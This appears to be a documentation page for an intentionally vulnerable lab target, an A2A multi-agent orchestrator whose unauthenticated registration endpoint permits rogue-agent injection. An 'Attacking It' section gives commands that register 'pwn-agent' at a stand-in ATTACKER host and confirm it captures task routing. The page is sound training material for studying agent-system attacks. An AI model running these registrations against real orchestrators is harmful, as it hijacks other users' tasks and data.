---
title: A2A Orchestrator (ailab-app)
---

# A2A Orchestrator (ailab-app)

## What It Is

A multi-agent coordinator that maintains a registry of worker agents and dispatches tasks to
whichever registered agent advertises a matching skill. It is the target for the `a2a register`
verb (rogue-agent injection).

## Modeled Weakness

**Unauthenticated agent registration.** `POST /agents/register` requires no auth, so anyone who can
reach the orchestrator can register an agent pointed at attacker-controlled infrastructure. From
that moment the orchestrator routes matching tasks to the rogue agent — a confused-deputy /
rogue-agent-injection weakness. The orchestrator seeds three legitimate worker agents; a rogue
registration for the same skill wins routing (newest match).

## Surface

| Endpoint | Purpose |
|---|---|
| `GET /.well-known/agent-card.json` | The orchestrator's own A2A card |
| `GET /health` | Health |
| `GET /agents` | List registered agents (the registry) |
| `POST /agents/register` | Register an agent card (no auth) |
| `POST /agents/deregister` | Remove an agent by id |
| `POST /a2a/workflow` | Run a task: pick a registered agent by skill and route to it |

## Port & Unit

| Parameter | Value |
|---|---|
| Host | `ailab-app` (`172.16.50.40`) |
| Port | `8104` |
| systemd unit | `a2a-orchestrator.service` |

## Attacking It

```bash
# Register a rogue agent that advertises a skill the orchestrator dispatches
aipostex a2a --target http://172.16.50.40:8104 register \
  --agent-name pwn-agent --agent-url http://ATTACKER:9000 --skill nl-to-sql --force-exploit

# Confirm it is now in the registry and wins routing for that skill
curl -s http://172.16.50.40:8104/agents | jq '.agents[].name'
curl -s -X POST http://172.16.50.40:8104/a2a/workflow -d '{"skill":"nl-to-sql"}' | jq '.routed_to'
```

See [Scenario 17](../../attack-scenarios/scenario-17.md).
